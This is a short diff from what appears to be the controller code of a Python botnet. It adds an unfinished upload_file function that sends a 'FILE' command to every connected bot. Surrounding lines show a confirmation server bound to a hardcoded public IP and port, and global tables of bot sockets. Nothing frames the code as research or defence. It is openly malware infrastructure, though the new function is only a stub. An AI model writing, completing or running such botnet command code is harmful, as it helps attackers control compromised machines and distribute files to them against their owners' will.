@@ -27,6 +27,12 @@ test_conns = {}
 #            return True
 #    return False
 
+def upload_file(file):
+    global botnet
+    for bot in botnet:
+        botnet[bot].send("FILE".encode())
+        pass #BETA
+
 def start_confirmation_server(ip="159.65.11.28",port=2000):
     global test_conns,server_sockets
     s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
